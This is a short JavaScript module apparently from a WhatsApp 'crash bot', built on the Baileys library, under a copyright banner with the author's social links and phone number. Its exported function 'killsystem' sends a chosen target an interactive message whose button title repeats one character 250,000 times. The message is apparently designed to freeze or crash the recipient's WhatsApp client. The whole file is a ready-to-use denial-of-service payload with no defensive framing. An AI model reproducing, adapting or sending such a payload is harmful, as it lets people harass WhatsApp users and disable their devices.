/*
 * © 2026 Legend Bahirava (VOIDSEC)
 *
 * ⚠️ COPYRIGHT NOTICE
 * This source code is protected under copyright law.
 * Any form of re-uploading, recoding, modification,
 * selling, or redistribution WITHOUT explicit permission
 * from the original author is strictly prohibited.
 *
 * ❌ NO CREDIT = NO PERMISSION
 * ❌ DO NOT CLAIM THIS CODE AS YOUR OWN
 *
 * ✔️ Usage or modification is allowed ONLY
 * with prior permission and proper credit.
 *
 * OFFICIAL LINKS (ONLY):
 * YouTube   : https://www.youtube.com/@bahiravabahirava-e1p5m
 * Instagram : LG_Bahirava
 * Telegram  : https://t.me/LG_BAHIRAVA
 * WhatsApp  : +94704703791
 *
 * Violations may result in DMCA takedown
 * or termination of the Telegram bot.
 */

const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto')

async function killsystem(SYxS7, target) {   
  const vnxsingle = {
    interactiveMessage: {
      body: {
        text: "🩸⃟༑‣𝐋͢𝐆 𝐁͢𝐀𝐇͢𝐈𝐑͢𝐀𝐕͢𝐀",
        format: 1
      },
      footer: {
        text: "🩸⃟༑‣𝐋͢𝐆 𝐁͢𝐀𝐇͢𝐈𝐑͢𝐀𝐕͢𝐀",
        format: 1
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "VnX Select The Button" + "ꦾ".repeat(250000),  
            }),
          }
        ]
      }
    }
  };
                                                
  await SYxS7.relayMessage(target, vnxsingle, { 
    participant: { jid: target } 
  });
}
module.exports = { killsystem };
